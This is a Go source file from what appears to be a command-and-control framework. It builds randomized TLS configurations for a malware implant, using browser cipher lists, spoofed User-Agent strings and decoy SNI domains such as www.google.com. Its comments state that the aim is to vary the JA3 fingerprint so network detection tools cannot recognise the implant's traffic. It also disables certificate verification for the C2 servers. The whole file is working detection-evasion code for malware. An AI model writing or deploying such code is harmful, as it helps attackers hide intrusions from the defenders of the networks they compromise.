package c2

import (
	crand "crypto/rand"
	"crypto/tls"
	"encoding/binary"
)

// Browser cipher suite lists matching real browser TLS ClientHello fingerprints.
// These are ordered to match each browser's actual negotiation preference,
// producing JA3 hashes that blend with legitimate traffic on the wire.

// chromeCiphers matches Chrome 120+ cipher suite order.
var chromeCiphers = []uint16{
	tls.TLS_AES_128_GCM_SHA256,
	tls.TLS_AES_256_GCM_SHA384,
	tls.TLS_CHACHA20_POLY1305_SHA256,
	tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
	tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
	tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
	tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
	tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,
	tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
	tls.TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA,
	tls.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,
	tls.TLS_RSA_WITH_AES_128_GCM_SHA256,
	tls.TLS_RSA_WITH_AES_256_GCM_SHA384,
	tls.TLS_RSA_WITH_AES_128_CBC_SHA,
	tls.TLS_RSA_WITH_AES_256_CBC_SHA,
}

// firefoxCiphers matches Firefox 121+ cipher suite order.
var firefoxCiphers = []uint16{
	tls.TLS_AES_128_GCM_SHA256,
	tls.TLS_CHACHA20_POLY1305_SHA256,
	tls.TLS_AES_256_GCM_SHA384,
	tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
	tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
	tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,
	tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
	tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
	tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
	tls.TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA,
	tls.TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA,
	tls.TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA,
	tls.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,
	tls.TLS_RSA_WITH_AES_128_GCM_SHA256,
	tls.TLS_RSA_WITH_AES_256_GCM_SHA384,
	tls.TLS_RSA_WITH_AES_128_CBC_SHA,
	tls.TLS_RSA_WITH_AES_256_CBC_SHA,
}

// safariCiphers matches Safari 17+ (macOS/iOS) cipher suite order.
var safariCiphers = []uint16{
	tls.TLS_AES_128_GCM_SHA256,
	tls.TLS_AES_256_GCM_SHA384,
	tls.TLS_CHACHA20_POLY1305_SHA256,
	tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
	tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
	tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,
	tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
	tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
	tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
	tls.TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA,
	tls.TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA,
	tls.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,
	tls.TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA,
	tls.TLS_RSA_WITH_AES_256_GCM_SHA384,
	tls.TLS_RSA_WITH_AES_128_GCM_SHA256,
	tls.TLS_RSA_WITH_AES_256_CBC_SHA,
	tls.TLS_RSA_WITH_AES_128_CBC_SHA,
}

// allBrowserCiphers is the union pool used by RandomizedTLSConfig.
// It contains every cipher suite that appears in at least one major browser,
// giving us a realistic selection space for randomized fingerprints.
var allBrowserCiphers = mergeCipherSets(chromeCiphers, firefoxCiphers, safariCiphers)

// Browser-matching User-Agent strings. Each entry corresponds to a browser
// profile so the HTTP-layer fingerprint is consistent with the TLS fingerprint.
var browserUserAgents = map[string][]string{
	"chrome": {
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	},
	"firefox": {
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
		"Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0",
	},
	"safari": {
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
	},
}

// Common elliptic curves used by browsers for TLS key exchange.
var browserCurves = []tls.CurveID{
	tls.X25519,
	tls.CurveP256,
	tls.CurveP384,
}

// Common SNI domains that appear in high-volume HTTPS traffic.
// Used when domain fronting is not active, so the SNI field does not
// stand out as an obvious Go default or missing value.
var commonSNIDomains = []string{
	"www.google.com",
	"www.microsoft.com",
	"www.amazon.com",
	"login.microsoftonline.com",
	"cdn.jsdelivr.net",
	"ajax.googleapis.com",
	"fonts.googleapis.com",
	"cdnjs.cloudflare.com",
	"api.github.com",
	"graph.microsoft.com",
}

// CryptoRandIntn returns a cryptographically secure random int in [0, n).
// Uses rejection sampling to eliminate modular bias.
func CryptoRandIntn(n int) int {
	if n <= 0 {
		return 0
	}
	max := ^uint64(0) - (^uint64(0) % uint64(n))
	for {
		b := make([]byte, 8)
		_, _ = crand.Read(b)
		v := binary.BigEndian.Uint64(b)
		if v < max {
			return int(v % uint64(n))
		}
	}
}

// RandomizedTLSConfig returns a tls.Config with randomized parameters that
// produce a different JA3 hash each call. The cipher suite order, curve
// preferences, and SNI are all varied to prevent NDR tools from building
// a stable fingerprint of the implant's TLS stack.
func RandomizedTLSConfig() *tls.Config {
	// Pick a random subset of ciphers (at least 8, at most all).
	poolCopy := make([]uint16, len(allBrowserCiphers))
	copy(poolCopy, allBrowserCiphers)
	poolCopy = ShuffleCiphers(poolCopy)

	subsetSize := 8 + CryptoRandIntn(len(poolCopy)-8+1)
	ciphers := poolCopy[:subsetSize]

	// Randomize curve preferences. Always include X25519 (most common) but
	// shuffle the rest for variety.
	curves := make([]tls.CurveID, len(browserCurves))
	copy(curves, browserCurves)
	shuffleCurves(curves)

	// Pick a random benign SNI. This is overridden by domain fronting when active.
	sni := commonSNIDomains[CryptoRandIntn(len(commonSNIDomains))]

	cfg := &tls.Config{
		CipherSuites:       ciphers,
		CurvePreferences:   curves,
		MinVersion:         tls.VersionTLS12,
		MaxVersion:         tls.VersionTLS13,
		ServerName:         sni,
		InsecureSkipVerify: true, //nolint:gosec // C2 infra uses self-signed or fronted certs
	}

	return cfg
}

// ShuffleCiphers performs a Fisher-Yates shuffle on a cipher suite slice,
// returning the shuffled result. The input slice is modified in place and
// also returned for convenience.
func ShuffleCiphers(ciphers []uint16) []uint16 {
	for i := len(ciphers) - 1; i > 0; i-- {
		j := CryptoRandIntn(i + 1)
		ciphers[i], ciphers[j] = ciphers[j], ciphers[i]
	}
	return ciphers
}

// RandomBrowserUA returns a random User-Agent string for the given browser
// profile. If the browser is unknown, a random Chrome UA is returned.
// This should be used alongside RandomizedTLSConfig to keep the HTTP-layer
// and TLS-layer fingerprints consistent.
func RandomBrowserUA(browser string) string {
	agents, ok := browserUserAgents[browser]
	if !ok {
		agents = browserUserAgents["chrome"]
	}
	return agents[CryptoRandIntn(len(agents))]
}

// shuffleCurves performs a Fisher-Yates shuffle on a CurveID slice.
func shuffleCurves(curves []tls.CurveID) {
	for i := len(curves) - 1; i > 0; i-- {
		j := CryptoRandIntn(i + 1)
		curves[i], curves[j] = curves[j], curves[i]
	}
}

// mergeCipherSets returns the ordered union of multiple cipher suite slices.
// Duplicates are removed; the first occurrence determines position.
func mergeCipherSets(sets ...[]uint16) []uint16 {
	seen := make(map[uint16]struct{})
	var merged []uint16
	for _, set := range sets {
		for _, c := range set {
			if _, exists := seen[c]; !exists {
				seen[c] = struct{}{}
				merged = append(merged, c)
			}
		}
	}
	return merged
}
